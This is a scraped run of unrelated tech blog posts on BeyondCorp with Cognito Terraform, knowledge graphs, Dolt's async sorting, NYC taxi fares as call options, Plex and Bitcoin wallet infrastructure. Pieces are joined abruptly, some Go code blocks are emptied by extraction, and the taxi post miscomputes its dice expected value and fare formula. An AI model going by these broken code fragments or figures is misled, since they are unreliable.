href="https://en.wikipedia.org/wiki/Pinwale">NSA’s PINWALE database was overwhelmed</a>.</p><p>This attack was painfully simple. In today’s world of cloud everything, it’s important to remember that the VPN that protects your network physically exists somewhere, and that the cables that your network traffic flows through exist physically somewhere. Attackers are smart, and will make use of all vectors at their disposal.</p><p>In contrast, BeyondCorp authenticates all requests, even those inside your private networks. Services like AWS App Mesh will <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/app-mesh/latest/userguide/proxy-authorization.html">soon require that Proxy Authorization is used for all internal requests</a>. This requirement, as well as the increased ease of using TLS everywhere on service meshes, makes it far easier to enforce encryption and security for your network traffic.</p><h2 id="where-do-we-start">Where do we start?</h2><p>AWS has a few services that make implementing BeyondCorp quite manageable. If you’re getting nervous and thinking that adding application code to every single frontend and backend in your company sounds like a lot of work, have no fear—Amazon Cognito is here!</p><p><a target="_blank" rel="noopener noreferrer" href="https://aws.amazon.com/cognito/">Amazon Cognito</a> is a managed service for authentication management. It connects with many identity providers, like Google, Facebook, and Apple, while also supporting generic providers through SAML and OpenID Connect.</p><p>If you aren’t familiar with these authentication protocols, just know that it means that in the Codelabs demo from earlier, you can change the GSuite login to be login through Okta, Amazon accounts, your company’s custom auth, etc.</p><p>Cognito is a great fit for introducing BeyondCorp because it lives at the infrastructure level, and can be easily added to individual services. This makes adding BeyondCorp incrementally easy, and also means that you don’t need to make <strong>any</strong> application code changes. If you have polyglot apps written in a variety of languages and frameworks, you’re in luck: Cognito works the same way for all of them.</p><h2 id="creating-a-cognito-user-group">Creating a Cognito User Group</h2><p>The first step of this process is to create a group of people who can access your resources. With Cognito, each different group of people that should have access to a different set of resources can be made into a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools-user-groups.html">User Pool</a>.</p><p>To create a User Pool with <a target="_blank" rel="noopener noreferrer" href="https://www.terraform.io/">Terraform</a>, we can write:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool"</span><span> </span><span>"pool"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>name</span><span> </span><span>=</span><span> </span><span>"codelab-user-pool"</span><span></span></p><p><span>3</span><span></span><span>}</span></p></pre></div><p>The next step is to create a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">User Pool App Client</a>, which is what controls the settings for how users can authenticate to the User Pool:</p><div><pre><p><span>1</span><span>locals</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>         </span><span>=</span><span> </span><span>"codelabs.dev.trancsend.com"</span><span></span></p><p><span>3</span><span>  </span><span>backend_alias</span><span>  </span><span>=</span><span> </span><span>"beyondcorp-alb.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>4</span><span>  </span><span>frontend_alias</span><span> </span><span>=</span><span> </span><span>"beyondcorp-cloudfront.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>5</span><span></span><span>}</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>resource </span><span>"aws_cognito_user_pool_client"</span><span> </span><span>"client"</span><span> </span><span>{</span><span></span></p><p><span>8</span><span>  </span><span>name</span><span>                </span><span>=</span><span> </span><span>"codelab-user-pool-client"</span><span></span></p><p><span>9</span><span>  </span><span>user_pool_id</span><span>        </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>10</span><span>  </span><span>generate_secret</span><span>     </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>11</span><span>  </span><span>allowed_oauth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span>"code"</span><span>]</span><span></span></p><p><span>12</span><span>  </span><span>callback_urls</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>13</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>backend_alias</span><span>}</span><span>/oauth2/idpresponse"</span><span>,</span></p><p><span>14</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>frontend_alias</span><span>}</span><span>"</span><span>,</span></p><p><span>15</span><span>  </span><span>]</span><span></span></p><p><span>16</span><span>  </span><span>allowed_oauth_scopes</span><span>                 </span><span>=</span><span> </span><span>[</span><span>"email"</span><span>, </span><span>"openid"</span><span>]</span><span></span></p><p><span>17</span><span>  </span><span>allowed_oauth_flows_user_pool_client</span><span> </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>18</span><span>  </span><span>supported_identity_providers</span><span>         </span><span>=</span><span> </span><span>[</span><span>"COGNITO"</span><span>]</span><span></span></p><p><span>19</span><span>  </span><span>explicit_auth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>20</span><span>    </span><span>"ALLOW_CUSTOM_AUTH"</span><span>,</span></p><p><span>21</span><span>    </span><span>"ALLOW_REFRESH_TOKEN_AUTH"</span><span>,</span></p><p><span>22</span><span>    </span><span>"ALLOW_USER_SRP_AUTH"</span><span>,</span></p><p><span>23</span><span>  </span><span>]</span><span></span></p><p><span>24</span><span></span><span>}</span></p></pre></div><p>In this example, we have not enabled an Identity Provider (IdP), so only username and password auth is accepted.

<p>Recently I read this article (<a href="https://www.zdnet.com/article/cloudera-adds-data-engineering-visualization-to-its-data-platform/">Cloudera adds data engineering, visualization to its Data Platform</a>) and wondered why it was relevant. To an industry-expert the implications are clear, but to me – an industry-novice – not. This situation made me wonder how a knowledge graph can be used to automatically answer the “why” behind a company’s decision.</p>



<p>Based on an innovation process in <a href="https://blog.researchly.app/posts/How-to-innovate-with-morphology-matrices/">patent analysis</a>, I came up with this process:</p>



<ol><li>I manually identified a similar article (<a href="https://stratechery.com/2019/tech-and-antitrust-follow-up-google-buys-looker-salesforce-buys-tableau/">Tech and Antitrust Follow-up, Google Buys Looker, Salesforce Buys Tableau</a>; paywall)</li><li>From this article, I constructed the knowledge graph below. I defined explicit relationships (as mentioned in the article) and implicit relationships (in green; these relationships can be inferred from an external knowledge source like Wikipedia)</li></ol>



<figure><img loading="lazy" width="731" height="1024" src="http://leobosankic.com/wp-content/uploads/2020/10/Untitled-Diagram-731x1024.png" alt="" srcset="http://leobosankic.com/wp-content/uploads/2020/10/Untitled-Diagram-731x1024.png 731w, http://leobosankic.com/wp-content/uploads/2020/10/Untitled-Diagram-214x300.png 214w, http://leobosankic.com/wp-content/uploads/2020/10/Untitled-Diagram-768x1076.png 768w, http://leobosankic.com/wp-content/uploads/2020/10/Untitled-Diagram.png 797w" sizes="(max-width: 731px) 100vw, 731px"><figcaption>Knowledge Graph depicting the situation before Google acquired Looker</figcaption></figure>



<p>The knowledge graph depicts the following points:</p>



<ul><li>Google’s biggest competitors (Microsoft and Amazon) own tools in the data analytics and visualization segment (Looker’s segment)</li><li>the data analytics and visualization segment is important to Google because that segment is part of the “Big Data movement” (implicit relationship) and “Big Data” is important to Google (implicit relationship)</li><li>Google does not own any tools in the analytics segment</li></ul>



<p>Based on this information, it makes sense that Google acquired a tool in the data analytics and visualization segment.</p>



<p>Re-stating the reasoning from the base article: Google acquired Looker because Google’s Cloud competitors are expanding into a segment which</p>



<ul><li>is adjacent to Cloud</li><li>important to Google</li><li>a segment where Google is not active</li></ul>



<p>From a technical standpoint, this means predicting the relationship “Google -[owns]-&gt; Looker” (using some Graph algorithm).</p>



<p>Having established this base graph, understanding the original article (<a href="https://www.zdnet.com/article/cloudera-adds-data-engineering-visualization-to-its-data-platform/">Cloudera adds data engineering, visualization to its Data Platform</a>) becomes a matter of replacing Google with Cloudera and Looker with Cloudera Data Visualization.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>When we began working on <a href="https://doltdb.com/">Dolt</a> we made the decision to build on top of <a href="https://github.com/attic-labs/noms">Noms</a>. Noms
stores data in a content addressable <a href="https://en.wikipedia.org/wiki/Directed_acyclic_graph">DAG</a>, and has countless applications.  It was a great starting point for us to build
<a href="https://doltdb.com/">Dolt</a>, and it let us hit the ground running.  Once we had a working prototype of the product we began importing data.<br>
Every dataset we imported taught us something new about the product. It helped us find issues with our code and dependencies,
and it helped us understand the scale of data that we could handle.  At that time, doing an import with a few million
rows could be painfully slow. As I dove into the profile the majority of the time was spent sorting, and this is how I
fixed that.</p>

<p>Dolt stores tables in Noms, in a map, the details of which were covered by <a href="https://www.dolthub.com/team#aaron">Aaron Son</a>
in <a href="https://www.dolthub.com/blog/2020-04-01-how-dolt-stores-table-data/">this blog article</a>.  The TLDR is that a B-Tree
like structure, called a Prolly-tree, backs the map that stores our table data.  To efficiently edit our map,
we need to apply edits in order. </p>
<p>The guys at Attic Labs, who wrote Noms, wrote a really cool way to get data into a map with their
<a href="https://github.com/attic-labs/noms/blob/master/go/types/map.go#L46">streaming map</a> implementation. It takes a channel
as an argument which you stream keys and values to, and returns a channel which you can read the resulting map from.
It's pretty fast, and there is something about the interface that feels like <a href="https://en.wikipedia.org/wiki/Rob_Pike">Rob Pike</a> would love it. The gotchas are:</p>
<ol>
<li>You need to stream your data into the map in order.</li>
<li>It only works for new maps. You cannot use it to edit a map that already has data in it. </li>
</ol>
<p>In either of these cases you'll need to use a <code>MapEditor</code> which collects a list of changes that will be applied to the
map, and only after all the edits are collected, does it sort all the changes, and then apply them. Dolt may have been
the first Noms use case which needed to be able to support reading in billions and applying billions of map edits, so
this was likely the first time this case was optimized for.</p>

<p>Before they can be applied, the edits are read from some source into a list. During this time Dolt is IO bound, and there
are idle CPU cycles that could be used to decrease our sort time once all the data is available.</p>
<p>In order to take advantage of the up front time we need to use an algorithm where work done prior to having all of the
items results in improved sort times once you do have all the items.  In order to accomplish this, we accumulate edits
into batches and once a batch is full it is sent to a background worker routine which sorts it. Once all the edits have
been added, we wait for our workers to finish sorting in the background, and then merge sort the batches of sorted
edits.  This has the additional benefit of being highly parallelizable.  Each batch sort can run in a go routine,
and as we merge the batches, pairs of batches can be merged in separate routines as well.</p>

<h2>Refactoring Before we Start</h2>
<p>The first step in our implementation is to replace the slice accumulating the edits with an interface which can be swapped
in and out to make it easy to compare the existing performance and results with the new implementation. </p>
<div data-language="go"><pre><code>

<span>type</span> EditAccumulator <span>interface</span> <span>{</span>
	
	<span>AddEdit</span><span>(</span>k Value<span>,</span> v Value<span>)</span>

	
	
	<span>FinishedEditing</span><span>(</span><span>)</span> <span>(</span>EditProvider<span>,</span> <span>error</span><span>)</span>

	
	
	<span>Close</span><span>(</span><span>)</span>
<span>}</span>



<span>type</span> EditProvider <span>interface</span> <span>{</span>
	
	
	<span>Next</span><span>(</span><span>)</span> <span>(</span><span>*</span>KVP<span>,</span> <span>error</span><span>)</span>

	
	<span>NumEdits</span><span>(</span><span>)</span> <span>int64</span>
<span>}</span></code></pre></div>
<h2>Background Sorting of Batches</h2>
<p>Now that we know what we need to implement lets take a look at our new AddEdit implementation.  It's pretty straight
forward: we add our edits to a slice, and once the slice is full, we write that slice to a channel and create a new slice
to accumulate map edits into.</p>
<div data-language="go"><pre><code>
<span>func</span> <span>(</span>ase <span>*</span>AsyncSortedEdits<span>)</span> <span>AddEdit</span><span>(</span>k Value<span>,</span> v Value<span>)</span> <span>{</span>

<span>}</span></code></pre></div>
<p>Our <code>sortChan</code> is being read by a go routine running the function <code>sorter</code> which sorts it and writes the results to <code>resultsChan</code></p>
<div data-language="go"><pre><code><span>func</span> <span>sorter</span><span>(</span>in<span>,</span> out <span>chan</span> types<span>.</span>KVPSlice<span>)</span> <span>error</span> <span>{</span>

<p>We will accumulate edits until the point when <code>FinishedEditing</code> is called at which time we need to return an <code>EditProvider</code>
which is used to iterate over all the edits in sorted order.  We close our background batch sorting channel, <code>sortChan</code>,
sort any edits that are in the <code>accumulating</code> slice, and then wait for all background sorting to finish before calling
<code>mergeSortBatches</code>.</p>

<h2>Merging Sorted Batches</h2>
<p>We have a list of sorted batches, that we need to merge.  We need a way of grouping our batches into pairs. As you merge
N batches, pairwise, down to a single collection of sorted edits, it is possible that your batches vary in size wildly.
Say you have 9 batches of edits. Here are two ways they could be merged:</p>
<div data-language="text"><pre><code>10   10 10   10 10   10 10   10 3        3    10 10   10 10   10 10   10 10
 \  /    \  /    \  /    \  /   |          \  /    \  /    \  /    \  /   |
  20      20      20      20    |           13      20      20      20    10
  20      20      20      20    |           10      13      20      20    20
    \    /          \    /      |            \      /        \      /     |
     \  /            \  /       |             \    /          \    /      |
      40              40        |               23              40        20
      40              40        |               20              23        40
        \             /         |                 \            /          |
         ------+------          |                  ------+-----           |
               80               3                        43               40
                 \             /                           \             /
                  ------+------                             ------+------
                        83                                        83</code></pre></div>
<p>The first approach uses a naive merge order.  The second sorts by size between levels which results in more even batches being
grouped as you merge down each batch.  I don't believe there to be a measurable performance impact of either strategy,
but we opted to go with the more balanced approach.</p>

<p>Now that we have a strategy for pairing our batches we can get back to merging them into a single sorted collection.  We
spawn worker go routines to handle the merge operations up to some configurable limit.  Then we write our batch pairs
to a channel to be sorted, and close the channel once all the batches being merged have been written.  Then we will wait
for the results before doing it all over again for the next level of our merge tree.</p>

<p>The code presented here omits some error handling for clarity, and does not go into the details of
<a href="https://en.wikipedia.org/wiki/Merge_sort">merge sort</a> implementation, but the full source code can be found
<a href="https://github.com/dolthub/dolt/tree/master/go/store/types/edits">here</a>.</p>

<p>This video provides a visual representation of the old and new sorting strategies.  At the start of the video you can
see data being added, and after half a second we begin async sorting our first batch.  The process of adding and concurrently
sorting batches asynchronously continues for about 5 seconds until all the data is available.  It is at this time that the
old model begins sorting it's data, and then at 6 seconds all of our batches are sorted and we begin merging.  The new
model completes in about 8 seconds, and the old is done after 15.</p>

<p>While the visualization helps us see what's going on, they may not represent real world benchmarks.  On small sets of
changes (small being less than 1 batch), our new methodology is identical to the old.  For change sets where the number
of edits is just slightly more than one the additional parallelism has a small negative performance impact.  After that
the performance impacts are very positive.  Benchmarking 10 million edits gave the following results on average:</p>
<ul>
<li>
<p>Async Batch Sorting with Merge</p>
<ul>
<li>Time to add the items: 7.52</li>
<li>Time to sort once all items are added: 3.16</li>
</ul>
</li>
<li>
<p>sort.Stable once all items are added:</p>
<ul>
<li>Time to add the items: 8.97</li>
<li>Time to sort once all items are added: 32.96</li>
</ul>
</li>
</ul>
<p>Roughly a 10x performance improvement in the sort time, meant that Dolt users are able to get data into a table more
quickly.  Another interesting improvement was in the amount of time needed …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Every cab I have ever ridden has been complaining about how hard it is to make
ends meet as a driver. The public is generally quick to blame unfair competition
from the likes of Uber. However, additional forces are also to blame.</p><p>Going through more than 10 years worth of NYC taxi data, I analyse how the
antiquated meter system impacts the livelihood of NYC cabbies by drawing an
analogy with stock options trading. Interestingly, this approach allows us to
show that drivers have progressively been worse-off, independently of
competition from Uber.</p><p>In order to do so, we have loaded a dataset into our database QuestDB. This
dataset includes over 1.6 billion taxi rides, 700 million FHV rides (Uber, Lyft
etc), and 10 years of weather and gas prices data.</p><p>A few of months ago, I was putting together data for QuestDB's demo that we
shared on <a href="https://news.ycombinator.com/item?id=23616878" target="_blank" rel="noopener noreferrer">ShowHN</a>.</p><p>It has been a while since I left derivatives trading, and was not expecting to
end up writing about options pricing. Much to my surprise, the economics of a
taxi meter are very similar to options. This provides an interesting perspective
into the fate of taxi drivers.</p><h2>The economics of the taxi meter</h2><p>Most rides are priced using the
<a href="https://www1.nyc.gov/site/tlc/passengers/taxi-fare.page" target="_blank" rel="noopener noreferrer">standard meter system</a>.
The meter is a machine, which calculates the price of a ride based on inputs
such as time, speed, and distance. Additionally, it adds taxes, tolls and
surcharges depending on a variety of factors such as the route taken or the time
of the day.</p><p>Most of the driver's earnings come from the <code>fare</code>, which consists of a
<code>flat fare</code> $2.50 for entering the cab, and a <code>variable fare</code>. The variable
fare is a function of speed, time and distance. It is calculated as follows:</p><ul><li>When the cab drives above 12mph, $2.50 per mile</li><li>Otherwise, $0.50 per minute</li></ul><p>This post focuses on the variable fare, i.e the output of the meter excluding
the $2.50 start fee and extras. To be able to compare rides with one another,
we normalize it as an <code>hourly rate</code> of driving a customer around.</p><h2>Modelling variable earnings for taxi drivers</h2><p>Let's assume a cab is driving a customer at a constant speed during one hour. At
the end of the hour, the driver can expect to pocket <code>variable earnings</code> of:</p><ul><li>$30 if they drove below 12mph ($0.50 a minute)</li><li>$2.50 x their average speed if they drove above 12mph</li></ul><p>Let's plot the hourly earnings in function of speed. This instantly reminds me
of an old friend: call options!</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed.png"><p>Rewriting the fare formula as follows, we recognize the call option formula
<code>Max(0, S-K)</code>.</p><p><code>Hourly Fare = 30 + max(0, Speed - 12)</code></p><p>Interestingly, the above notation breaks down the hourly variable fare into two
components.</p><ul><li>A <code>guaranteed</code> component <code>30</code>: whenever driving a customer, a cab will make at
least $30 an hour.</li><li>An <code>optional</code> component <code>max(0, Speed - 12)</code>: driving customers faster earns
the driver more.</li></ul><p>Graphically, the breakdown between <code>guaranteed</code> and <code>optional</code> fare components
look like the below:</p><img alt="A chart of call option payoff showing how cab drivers earnings increase with their average realized driving speed broken down between fixed and variable" src="https://questdb.io/img/blog/2020-10-16/cab-hourly-earnings-by-speed-breakdown.png"><p>There is a reason for this system. It is designed to align the interests of
drivers and riders:</p><ul><li>The <code>guaranteed</code> part makes discourages riders from making the driver wait and
ensures they are paid for their time.</li><li>The <code>optional</code> part discourages drivers from purposefully taking customers
through traffic.</li></ul><p>Let's try to quantify the value of the optional part by using options pricing
methods in order to study the incentive for drivers.</p><h2>A simple approach to options pricing</h2><p>This post isn’t meant as an essay in financial mathematics (far from it).
However, before we continue, it is useful to understand what makes options
valuable. Buying an option is like paying to play a game with a monetary payout
contingent on some <code>variable</code>.</p><p>As an example, think of a dice game. If the die value (our variable) is below 2,
you receive 0. Otherwise, you receive the difference between that value and 2.
In financial markets, the threshold of 2 is known as the <code>strike price</code> and is
denoted K.</p><p><strong>You have to pay a fee to play this game. How much are you ready to pay?</strong></p><p>To find out, we need to calculate the expected value of a game. This is easy
since we know all <code>possible outcomes</code> and their
<code>respective probabilities of occurrence</code>. We can write these in the table below:</p><table><thead><tr><th>Dice value</th><th>Probability</th><th>Payout</th><th>Weighed payout</th></tr></thead><tbody><tr><td>1</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>2</td><td>16.66%</td><td>0</td><td>0</td></tr><tr><td>3</td><td>16.66%</td><td>1</td><td>0.1666</td></tr><tr><td>4</td><td>16.66%</td><td>2</td><td>0.3332</td></tr><tr><td>5</td><td>16.66%</td><td>3</td><td>0.4998</td></tr><tr><td>6</td><td>16.66%</td><td>4</td><td>0.6664</td></tr></tbody></table><p>By summing all the potential payouts weighed by their probability, we compute
the expected value of playing this game: $1.4494.</p><ul><li>If we pay less to play the game, we will make money over time.</li><li>If we pay more, we lose in the long run.</li></ul><p>This example shows that in its simplest form, the value of an option is equal to
the product of the payout profile and the associated probability distribution
when the option expires. Let’s visualize this by plotting the values for our
game in the following chart:</p><img alt="A chart showing the outcome profile of the dice game and the corresponding probabilities and probability-weighed expected payout values" src="https://questdb.io/img/blog/2020-10-16/die-game-payout-profile.png"><p>where:</p><ul><li>The white dashed line represents the possible (discrete) payouts for the game.</li><li>The cyan dotted line is the probability for each outcome (dice value) to
occur. It is a straight line at 16.66% since each of the 6 values is
equiprobable.</li><li>The coloured area is the product of the first two lines. Its total surface is
the value of our option.</li></ul><p>Of course, this is very simplified. I omit time value, which is the idea that
you (almost) always wish you could hold the option for longer. The reason time
value exists has to do with the asymmetric payoff profile: there is more to win
than to lose by waiting a little longer. Also, in real life, outcomes are rarely
equiprobable. For example, stock prices are represented as a log-normal
distribution. Nevertheless, this example gives a good introduction to calculate
the value of an option.</p><p>Now, since we saw that speed is the main driver behind the variable fare, we
should attempt to build a representation of speed distribution in order to
estimate the option value.</p><h2>Modelling cabs speed and option value</h2><p>This can be done using a log-normal distribution, which is analogous to the
normal distribution, but cannot be negative. This fits our situation well since
cabs can only drive above 0mph.</p><p>The log-normal distribution requires two parameters:</p><ul><li>the <code>mean</code>, i.e a driver's expected average speed for a given hour.</li><li>the <code>standard deviation</code>, a measure of how much the achieved speed is likely
to deviate from the mean.</li></ul><p>If we overlay the log-normal distribution to the option payoff, we can see the
option value below as the product of the two surface areas. As you can see, the
log-normal distribution is skewed to the left and the mode (the highest point on
the distribution, at around 10 mph) is lower than the mean (13 mph in the
above).</p><img alt="A chart of call option payoff with the corresponding probability and weighed value area as overlay" src="https://questdb.io/img/blog/2020-10-16/option-payoff-probability-value.png"><p>We can play with our two parameters to get a grasp on the pricing dynamics. Here
is how the average speed changes the distribution and expected option value:</p><img alt="A chart showing how distribution of outcomes and value change with the expected mean" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-avg.png"><p>And here is the effect of standard deviation:</p><img alt="A chart showing how distribution of outcomes and value change with the standard deviation" src="https://questdb.io/img/blog/2020-10-16/payout-change-with-stdev.png"><p>We can see that a higher mean and a higher standard deviation result in higher
option value. In short, this means that it is in the drivers' best interests to</p><ul><li>drive faster;</li><li>deviate for the mean, for example by taking risks.</li></ul><p>Now, to be clear, I don't mean that they should drive recklessly, but rather
that they should attempt "risky" routes, which could either save a lot of time,
or otherwise be a disaster.</p><p>In traditional finance, the sensitivities to input parameters, which we have
introduced above are called the “Greeks”. These are measures of risk named
(mostly) after Greek letters. They are used to evaluate and manage the risk of
options portfolios. Here are the two greeks respective to the mean and standard
deviation:</p><ul><li>The <code>delta</code>, change of option value relative to change of the mean</li><li>The <code>vega</code>, change of value relative to the change of standard deviation (aka
volatility).</li></ul><p>These are "first order" greeks, which means they directly affect the option
value. There are more greeks, of higher order, which affect the option value
indirectly. As example, the <code>vanna</code> is a second-order greek which measures how
much the delta (first order greek) of an option changes when volatility changes.</p><h2>Traffic increase has cost a great amount to taxi drivers</h2><p>Let’s first look at the average speed over time.</p><p>The NYC taxi dataset gives us the distance calculated by the meter, the pickup
timestamp, and the drop-off timestamp. Using QuestDB, we can derive the duration
of each ride as the difference between the two timestamps and divide the
distance by the duration, to calculate the average speed.</p><p>With <code>SAMPLE BY</code>, I compute the average results for monthly intervals and plot
it below. Over 10 years, the average speed dropped significantly from 13.3 to
9.7mph (almost 30%!).</p><img alt="A chart showing the evolution of the average cab driver speed over time and how it consistently dropped below the threshold" src="https://questdb.io/img/blog/2020-10-16/average-speed-over-time.png"><p>This number is a simplification since it assumes constant speed and no idle
time. However, it is useful to calculate a lower-bound for earnings as follows.</p><p><code>Min Hourly Variable Fare = Max($30, Avg(speed) * $2.5)</code></p><p>Similarly, we can estimate the upper bound of a driver’s hourly earnings in a
theoretical world where drivers are either idle or accelerate instantly from 0
to the speed limit of 25mph. This is how the maximum potential fare could be
calculated:</p><p><code>Max potential hourly variable fare = Distance component + Idle component</code></p><p><code>Distance component = Average ride distance * $2.50 / Average ride duration (hours)</code></p><p>and</p><p><code>Idle component = (25 - Average ride distance)/25mph * 60min * $0.50</code></p><p>Lastly, we can calculate the actual average variable fare over time as follows.</p><p><code>Actual Hourly Variable Fare =avg(fare_amount - $2.50) / avg(duration_hours) </code></p><p>Here is what the three metrics look like over time (note we started the plot in
September 2012 since cab prices were increased in August 2012. Interestingly,
the average minimum variable fare has dropped over time and is now hitting a
floor.</p><img alt="A chart showing the evolution of the average cab driver potential fare range against the actual average fare" src="https://questdb.io/img/blog/2020-10-16/potential-average-fare-range.png"><p>Now that we have the average speed, we can use the standard deviation to model
the speed distribution. By feeding the historical mean and standard deviations
into a log-normal distribution model, we can compute the following percentiles.
For the vast majority of rides, drivers can expect to average below 12mph.</p><img alt="A chart showing the evolution of the distribution of NYC cab drivers' average speed over time" src="https://questdb.io/img/blog/2020-10-16/distribution-speed-over-time.png"><p>To sum up, the following chart shows how the economics have changed over time.
We can see how this damaged the option value for drivers, mostly as a …</p></section></div>

<p>Not much to this. I’ve set up a Plex server on a 2011ish MacBook air. This server is also responsible for hosting some homemade services on my local network.</p>
<p>Eventually I’d like to get it working with some sort of attached storage, but at the moment I’m using the MacBook’s HD which is relatively meager once you start filling up the HD with movies. I don’t need much though, since the main purpose is providing my kids with better educational content than is offered on Netlix / Prime / Hulu, as well as allowing us to eliminate our Disney+ subscription. The kids watch the same movies over and over again (he said as he cued up Olaf’s Frozen Adventure for the 10,000th time).</p>
<p>Warning: It isn’t a fast process, at least not on an old-ass MacBook. Doing a full season of a TV show takes forever since FFMPEG goes through line by line.</p>
<p>Warning: This appends <code>.mp4</code> to the filename, meaning <code>some-movie.mkv</code> becomes <code>some-movie.mkv.mp4</code>. I’m working on a bulk file renaming tool to run afterward to format the titles into the Plex naming scheme (<code>"MASH s01e09"</code>).</p>

                    <p>-- by <a href="https://twitter.com/philipglazman">Philip Glazman</a>, Software Engineer</p><h2 id="introduction">Introduction</h2><p><a href="https://river.com/">River Financial​</a> specializes in Bitcoin brokerage and custody services. Core to our operations is our infrastructure enabling us to custody and transact Bitcoin securely and at scale on behalf of our clients.</p><p>When starting the company, there was no off-the-shelf Bitcoin software solution that was capable of powering the product we were building. We needed a Bitcoin wallet service with the following traits:</p><ol><li>Capable of watching and rescanning millions of wallets, each with many thousands of scripts</li><li>Capable of interfacing with heterogeneous set of signers (single and multisig)</li><li>Flexible enough to upgrade quickly as protocol improves (Schnorr, Taproot, etc.)</li><li>Capable of interfacing cleanly with monitoring and security tooling</li><li>Has a clean, reliable API that is flexible enough to serve internal software services that power a quickly changing Bitcoin financial services institution</li><li>Can generate transactions for Lightning Network channel management</li><li>Modular enough to physically isolate highly sensitive components (e.g. signers)</li></ol><p>Historically, Bitcoin software built for exchanges and brokerages - which we refer to as <em>enterprise Bitcoin software</em> - has been proprietary and severely lags consumer Bitcoin software. This is evidenced by the multi-year delays between network protocol upgrades and support from even the <a href="https://bitcoinops.org/en/compatibility/">largest exchanges</a>. Many companies also have the disadvantage of needing to support arbitrary numbers of cryptocurrencies, preventing them from optimizing their infrastructure for Bitcoin.</p><p>At River we decided to reimagine what Bitcoin infrastructure could look like and built what we believe is the world's best enterprise Bitcoin software from the ground up. This post goes into the details of our Bitcoin infrastructure, the design decisions we made, and what we learned along the way. &nbsp;</p><p>Our Bitcoin architecture consists of three main components:</p><ol><li><strong>Walletd</strong>: A service responsible for maintaining <a href="https://river.com/learn/terms/u/utxo/">UTXO</a> ownership data for an arbitrary number of wallets</li><li><strong>Signerd</strong>: A signer responsible for hot private key material</li><li><strong>Indexd</strong>: An index that maintains a view of the current state of the Bitcoin network</li></ol><p>Written in the Go language, these components are services with singular responsibilities and ownership of local data, communicating via a RabbitMQ AMQP message broker. We also run Bitcoin Core nodes through which we interact with the public Bitcoin network. Indexd talks directly to a Bitcoin Core node (see diagram below).</p><figure><img src="https://blog.river.com/content/images/2020/10/image-1.png" alt="" srcset="https://blog.river.com/content/images/size/w600/2020/10/image-1.png 600w, https://blog.river.com/content/images/2020/10/image-1.png 980w" sizes="(min-width: 720px) 720px"><figcaption>River Bitcoin Architecture</figcaption></figure><p>Enterprise bitcoin infrastructure is primarily responsible for observing the state of the blockchain, updating internal systems based on changes to that state, and contributing valid transactions to the network. A transaction is an object that contains information on how bitcoin is being spent. When a client sends Bitcoin to their River deposit address, we will see a transaction on the network creating a new output owned by River wallets. When a client withdraws Bitcoin, Walletd attempts to create a valid transaction with an output that the withdrawal recipient will own. Ownership of an output is defined by the scriptPubKey, or locking script, that sets the rules for how the bitcoin can be spent. The various addresses one sees, such as P2PKH (beginning with 1) or P2WSH (beginning with bc1), are different ways to lock bitcoin.</p><h2 id="transaction-lifecycle">Transaction Lifecycle</h2><p>Describing the standard transaction lifecycle can help illustrate how our Bitcoin infrastructure works as a whole. Typically, a Bitcoin transaction will first be detected by our system when it enters one of our nodes’ mempools, a local set of unconfirmed transactions. A transaction can stay in the mempool until it is either invalid, confirmed, or is evicted due to elapsed time or space constraints. Although some transactions do not enter the mempool before they are included in a block because they were sent to a miner directly, most transactions use the mempool to signal willingness for block inclusion. </p><p>Upon detection, <strong>Indexd</strong> parses the transaction and serializes relevant information for persistence. We persist all transactions that have occurred in the Bitcoin blockchain and network in a PostgreSQL database. This allows us to quickly query for transactions (via txid), scripts (scriptPubKey), and outpoints (txid:output). Using the message broker, our services use events to communicate new changes to the state of a transaction. Transaction detection in the mempool is an event that <strong>Indexd</strong> will subsequently publish to <strong>Walletd</strong>. The wallet parses the message and updates the state of UTXOs and scripts accordingly.</p><h2 id="system-components">System Components</h2><p>There are several events that the system is prepared to handle from the network including new transactions, blocks, rejected transactions, and block reorganizations.</p><p>A critical feature of this system is the persistence and ordered property of messages which flow through the AMQP message-broker. Given that we can always assume a new block will be parsed approximately every ten minutes, we do not need to optimize for scale or throughput. There is also an upper limit for compute resources for each block. Instead, we optimize for availability and reliability.</p><p>The ordering of state changes matters in the context of Bitcoin because a transaction can become detected in the mempool, confirmed in a block, orphaned, no longer valid, or evicted from the mempool. A guarantee of our message-broker is the ordering of messages. This is an especially useful property when block reorganizations happen. </p><p>When River Financial detects a transaction in our mempool, Indexd will parse the transaction and save the new <a href="https://river.com/learn/terms/u/utxo/">unspent transaction outputs</a> (UTXOs), scripts, and spent outpoints. It emits a message to Walletd with the new state of this particular transaction. Outlined below are some states that a transaction can experience within the course of its lifetime:</p><p><strong>Transaction Accept</strong></p><figure><img src="https://blog.river.com/content/images/2020/10/image-2.png" alt=""><figcaption>Transaction Accept</figcaption></figure><p>A transaction is accepted into the mempool. This transaction is waiting for block inclusion. A River client will see a pending transaction.</p><p><strong>Transaction 